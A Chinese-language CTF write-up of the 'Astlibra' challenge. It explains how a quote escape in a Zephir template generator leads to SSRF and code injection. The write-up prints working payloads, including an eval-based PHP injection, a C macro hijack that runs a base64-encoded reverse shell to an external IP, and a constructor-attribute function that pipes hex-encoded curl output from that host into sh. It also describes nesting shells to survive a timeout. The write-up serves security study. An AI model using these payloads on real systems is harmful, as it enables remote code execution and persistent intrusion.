---
archive: CTF
tags: 
  - SSRF
  - 代码注入
Date: 2023/1/10
---

# Astlibra

题目环境：
php7.4 + Zephir

用户输入一个链接，然后通过以下模板文件生成一个访问类。
```php
namespace {namespace};
class {class}{
    public function getURL(){
        return "{base64url}";
    }
    public function test(){
        var ch = curl_init();
        curl_setopt(ch, CURLOPT_URL, "{url}");
        curl_setopt(ch, CURLOPT_HEADER, 0);
        curl_exec(ch);
        curl_close(ch);
        return true;
    }
}
```

使用了 `preg_replace` 进行模板关键字的替换，主要逻辑：
```php
$zep_file = preg_replace('/(.*)\{namespace\}(.*)/is', '${1}'.$namespace.'${2}', $tmpl);
$zep_file = preg_replace('/(.*)\{class\}(.*)/is', '${1}'.$class.'${2}', $zep_file);
$zep_file = preg_replace('/(.*)\{base64url\}(.*)/is', '${1}'.base64_encode($url).'${2}', $zep_file);
$zep_file = preg_replace('/(.*)\{url\}(.*)/is', '${1}'.$url.'${2}', $zep_file);
```

其中只有 `url` 完全可控。WAF对于 `url` 进行了一次 `addslashes` 转义，并且在调用 `test` 函数之前会调用 `getURL` 然后 `base64decode` 检查 url 是否出现 `[a-zA-Z0-9_\/\.\:]` 之外的非法字符。

`bot.php` 读取模板文件内容并把它通过 [zephir](https://github.com/zephir-lang/zephir) 编译成 so 文件供 php 脚本调用。然后调用命令行执行 php 脚本。
```php
<?php
if (class_exists('\\{namespace}\\{class}')) {
    \$magic_methods = ['__construct', '__destruct', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__sleep', '__wakeup', '__toString', '__invoke', '__set_state', '__clone', '__debugInfo','__serialize','__unserialize'];
    foreach (get_class_methods('\\{namespace}\\{class}') as \$method) {
        if (in_array(\$method, \$magic_methods)) {
            die('Magic method ' . \$method . ' is not allowed');
        }
    }
    \$c = new \\{namespace}\\{class};
    \$url = base64_decode(\$c->getURL());
    if (preg_match('/[^a-zA-Z0-9_\/\.\:]/', \$url)) {
        die('Invalid characters in URL');
    }
    echo \$c->test();

} else {
    echo 'Class \\{namespace}\\{class} not found';
}
?>
```

Zephir 主要流程是将 php 代码生成 c 代码再编译得到 so 文件。

## `\` 绕过

使用 `\"` 经过`addslashes` + `preg_replace` 后会变成 `\\"` 从而逃出引号。

```php
<?php
$url = "\(";
$url = addslashes($url);
echo $url;
$url2 = preg_replace('/\{url\}/', $url, "{url}");
echo $url2;
// output:
// \\(
// \(
```

构造：
```
https://store.steampowered.com/app\");}}
payload
function foo(){if false{var bar=0;//
```

**使用 `${2}` ?**
```
https://store.steampowered.com/app${2}
payload/*
```

php模板会变成：
```php
namespace Admin;

class Simple{
    public function getURL(){
        return "base64";
    }
    public function test(){
        var ch = curl_init();
        curl_setopt(ch, CURLOPT_URL, "https://store.steampowered.com/app");
        curl_setopt(ch, CURLOPT_HEADER, 0);
        curl_exec(ch);
        curl_close(ch);
        return true;
    }
}
payload/*");
        curl_setopt(ch, CURLOPT_HEADER, 0);
        curl_exec(ch);
        curl_close(ch);
        return true;
    }
}
```

## 利用

### SSRF

php 的构造函数可以和类同名，在创建类实例时自动调用。如果存在 `__construct` 函数便会覆盖这个同名构造函数。

因此可以构造一个同名构造函数进行调用。

```
http://xxx\\"}
public function <classname>(){
	payload
var ch=0;//");
```

由于 zephir 自己的语言能力较弱，所以考虑直接使用 eval 执行 php 代码，然后用 php-curl 构造 ssrf 数据包。

关键 payload：[from](https://github.com/wupco/rwctf2023-ASTLIBRA/blob/main/exploit.py)
```
payload = 'http;Lyo;$bd = base64_decode($this->getURL()); $bd = $bd[5].$bd[6].$bd[7].$bd; eval(base64_decode($bd));//\\");} public function test123456(){ eval(base64_decode(this->getURL())); var ch = curl_init();//%s' % code.decode()
```

![](https://cdn.silente.top/img/p2.png)

### cblock

`secure.patch` 中有一个 fix 注释掉了 cblock 内容，翻 Zephir github 才知道它其实[支持](https://github.com/zephir-lang/zephir/issues/654)使用 cblock 内嵌 c 代码，（但是官方文档里并没有相关的指南hh）

类似于这种例子：
```php
namespace Testcurl;
%{
#include <stdio.h>
#include <curl/curl.h>
}%
class Simple
{
    public static function version() -> string
    {
        string ver="";
        %{
            ZVAL_STRING(ver, curl_version(), 1);
        }%
        return ver;
    }
    public static function getUrlContent(string! url)
    {
        %{
            CURL *curl;
            CURLcode res;
            curl = curl_easy_init();
            if(curl) {
              curl_easy_setopt(curl, CURLOPT_URL, Z_STRVAL_P(url));
              curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
              res = curl_easy_perform(curl);
              curl_easy_cleanup(curl);
            }
        }%
    }
}
```

而进一步翻阅源码可以知道 Zephir 在解析 cblock 时分为了全局域和函数域两个步骤，`secure.patch` 所在的 `Library/StatementsBlock.php` 仅仅对应了对于函数域的解析，然后对于全局域的解析是在 `Library/CompilerFile.php`，并没有被ban掉，所以可以在全局域嵌入 c 代码。

形如：
```
https://store.steampowered.com/app\");}}
%{
payload
}%
function foo(){if false {var bar=0;//
```

1. 劫持宏反弹shell

查看 Zephir 生成的 C 语言代码，可以看到在 `getURL` 那里调用了一个 Zend API： `RETURN_STRING`，重定义劫持宏达成命令执行。

```
https://store.steampowered.com/app\");}}
%{
#define A bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}'
#define _A(str) _TMP(str)
#define _TMP(str) #str
#define RETURN_STRING(a) system(_A(A))
}%
function foo(){if false {var bar=0;//
```

2. `__attribute__`
GNC C 特有的一个机制，可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。

```
https://store.steampowered.com/app\");}}
%{
__attribute__((constructor)) static void beforeFunction() {
char s[] = {0x63,0x75,0x72,0x6c,0x20,0x38,0x2e,0x31,0x34,0x32,0x2e,0x31,0x30,0x34,0x2e,0x37,0x38,0x3a,0x39,0x30,0x30,0x31,0x7c,0x73,
              0x68, 0x00};
        system(s);
};
}%
function a(){if false{var ch=0;//
```

### 维持

在执行 `bot.php` 时会加入一个 `timeout 10` 参数，需要获得一个持久的 shell。

经过尝试发现可以在弹的shell里面再弹一次shell，它就只会关闭第二个shell，第一个 shell 就不会 exit，不是很懂。。。

## Ref
- r3
- https://github.com/wupco/rwctf2023-ASTLIBRA
- [Zephir](https://github.com/zephir-lang/zephir)
- [Zend API](https://php.golaravel.com/internals2.ze1.zendapi.html)